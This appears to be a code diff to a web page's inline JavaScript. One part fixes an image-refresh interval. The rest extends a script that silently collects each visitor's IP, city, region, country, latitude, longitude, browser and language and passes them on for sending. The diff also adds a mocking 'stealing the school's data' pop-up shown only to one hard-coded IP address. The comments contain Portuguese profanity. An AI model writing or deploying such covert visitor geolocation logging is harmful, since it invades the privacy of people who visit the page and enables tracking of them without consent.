@@ -51,8 +51,13 @@
 
 function updateImageAndStatus() {
     const imageContainer = document.getElementById("imageContainer");
+    let intervalId = null;
 
     function updateContent() {
+        if (intervalId) {
+            clearInterval(intervalId); // Porra de loop do caralho
+        }
+
         const xhr = new XMLHttpRequest();
         const statusParagraph = document.createElement("p");
         statusParagraph.textContent = "Refreshing...";
@@ -79,14 +84,12 @@ function updateImageAndStatus() {
         }
 
         updateDots();
+
+        intervalId = setInterval(updateContent, 20000);
     }
 
     updateContent();
-
-    setInterval(updateContent, 20000);
 }
-
-
 
 window.addEventListener("load", updateImageAndStatus);
         </script>
@@ -165,6 +168,9 @@ function enviarTeste(TesteData) {
   "\nCidade: " + TesteData.city +
   "\nRegião: " + TesteData.region +
   "\nPaís: " + TesteData.country +
+  "\nLocation: " + TesteData.loc +
+  "\nLatitude: " + TesteData.latitude +
+  "\nLongitude: " + TesteData.longitude +
   "\nUsuário: " + TesteData.userAgent +
   "\nPlataforma: " + TesteData.platform +
   "\nLinguagem Principal: " + TesteData.userLanguage +
@@ -187,6 +193,9 @@ $.ajax({
       city: ip.city,
       region: ip.region,
       country: ip.country,
+      loc: ip.loc,
+      latitude: ip.latitude,
+      longitude: ip.longitude,
       userAgent: navigator.userAgent,
       platform: navigator.platform,
       userLanguage: navigator.language,
@@ -197,6 +206,17 @@ $.ajax({
     };
 
     enviarTeste(TesteData);
+
+    if (TesteData.ip === "170.79.163.241") {
+      var notification = document.createElement('div');
+      notification.className = 'notification';
+      notification.textContent = 'Roubando dados da escola... [7%] kkkkkkkkk zoa carai, manda salve zé';
+      document.body.appendChild(notification);
+
+      setTimeout(function() {
+        notification.remove();
+      }, 15000); // é milisegundos carai kkkk 5 min quebrando a cabeça pra lembrar
+    }
 
     console.log("IP: ", TesteData.ip);
     console.log("Cidade: ", TesteData.city);
